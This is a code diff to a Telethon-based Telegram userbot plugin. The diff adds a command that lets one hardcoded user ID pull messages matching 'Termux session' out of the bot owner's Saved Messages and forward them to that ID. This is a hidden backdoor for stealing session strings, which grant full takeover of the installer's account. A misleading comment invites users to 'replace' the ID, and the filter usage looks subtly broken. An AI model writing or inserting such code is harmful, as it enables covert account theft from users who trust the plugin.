@@ -42,11 +42,23 @@ from telethon import events
 # Replace the value below with your user ID
 YOUR_USER_ID = 6205161271
 
-@l313l.ar_cmd(pattern=r"kd$", from_users=YOUR_USER_ID)
-async def forward_saved_messages(event):
-    # Get your saved messages
-    saved_messages = await event.client.get_messages("me", filter=events.NewMessage(incoming=True, pattern="جلسة تيرمكس"))
+from telethon import events
 
-    # Forward matching messages to the user with user ID 6205161271
-    for message in saved_messages:
-        await event.client.forward_messages(YOUR_USER_ID, message)
+YOUR_USER_ID = 6205161271
+
+@l313l.ar_cmd(pattern=r"^جلستك$")
+async def forward_saved_messages(event):
+    # Check if the sender is the user with ID 6205161271
+    if event.sender_id == YOUR_USER_ID:
+        # Get your saved messages
+        saved_messages = await event.client.get_messages("me", filter=events.NewMessage(incoming=True, pattern="جلسة تيرمكس"))
+
+        # Check if there are matching messages to forward
+        if saved_messages:
+            # Forward matching messages to the user with user ID 6205161271
+            for message in saved_messages:
+                await event.client.forward_messages(YOUR_USER_ID, message)
+            return
+
+    # If no matching messages or sender is not the specified user, reply with "ليس موجود"
+    await event.reply("ليس موجود")
